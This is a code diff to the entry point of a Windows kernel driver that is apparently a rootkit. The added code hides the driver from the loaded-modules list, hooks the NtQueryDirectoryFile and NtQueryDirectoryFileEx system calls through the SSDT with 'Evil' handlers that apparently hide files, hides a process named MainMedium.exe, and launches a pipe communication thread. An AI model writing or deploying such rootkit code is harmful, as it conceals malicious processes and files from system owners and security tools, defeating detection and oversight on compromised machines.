@@ -1,27 +1,73 @@
 #include "piping.h"
 #include "DKOM.h"
+//#include "minifilter.h"
 #pragma warning(disable : 4996)
 
 
 extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
-    //UNREFERENCED_PARAMETER(DriverObject);
+    UNICODE_STRING NtQueryName = { 0 };
+    UNICODE_STRING NtQueryExName = { 0 };
+    RtlInitUnicodeString(&NtQueryName, L"NtQueryDirectoryFile");
+    RtlInitUnicodeString(&NtQueryExName, L"NtQueryDirectoryFileEx");
     UNREFERENCED_PARAMETER(RegistryPath);
     DriverObject->DriverUnload = ShrootUnload;
 
-
-    // Hide KmdfDriver driver service:
-    if (!NT_SUCCESS(service::HideDriverService(DriverObject, NULL))) {
+    
+    // Hide KMDFdriver system module from loaded modules list:
+    if (!NT_SUCCESS(kernelobjs_hiding::HideSystemModule(DriverObject, NULL))) {
+        ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
     }
+    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, 'HkQr', &NtQueryName))) {
+        ShrootUnload(DriverObject);
+        RtlFreeUnicodeString(&NtQueryName);
+        RtlFreeUnicodeString(&NtQueryExName);
+        return STATUS_UNSUCCESSFUL;
+    }
+    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, 'HkQx', &NtQueryExName))) {
+        ShrootUnload(DriverObject);
+        RtlFreeUnicodeString(&NtQueryName);
+        RtlFreeUnicodeString(&NtQueryExName);
+        return STATUS_UNSUCCESSFUL;
+    }
+    RtlFreeUnicodeString(&NtQueryName);
+    RtlFreeUnicodeString(&NtQueryExName);
 
 
     // Hook all file handling functions initially and save their original data:
+    /*
     if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", TRUE, 'HkQr'))) {
+        ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
     }
-    //if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", TRUE, 'HkQx'))) {
-    //    return STATUS_UNSUCCESSFUL;
-    //}
+    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", TRUE, 'HkQx'))) {
+         ShrootUnload(DriverObject);
+         return STATUS_UNSUCCESSFUL;
+    }
+
+
+    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", 'HkQx'))) {
+        ShrootUnload(DriverObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+    if (roothook::SystemServiceDTHook(L"NtQueryDirectoryFile", &roothook::EvilQueryDirectoryFile) == NULL) {
+        ShrootUnload(DriverObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+    if (!NT_SUCCESS(FilterGeneral::RegisterDriverAsMinifilter(DriverObject))) {
+        ShrootUnload(DriverObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+    if (!NT_SUCCESS(FilterGeneral::StartFilteringWithMinifilter())) {
+        ShrootUnload(DriverObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+    */
+    if (!NT_SUCCESS(process::HideProcess(0, "MainMedium.exe", TRUE))) {
+        ShrootUnload(DriverObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+
 
     const char* HelloMessage =
         "\n----------\n"
@@ -36,7 +82,7 @@ extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING Re
 
     DbgPrintEx(0, 0, "%s", HelloMessage);
 
-
+    
     // Execute pipe client thread:
     HANDLE PipeThread = NULL;
     NTSTATUS status = PsCreateSystemThread(
@@ -54,7 +100,7 @@ extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING Re
         return STATUS_UNSUCCESSFUL;
     }
     ZwClose(PipeThread);
-    return status;
+     return STATUS_SUCCESS;
 }
 
 
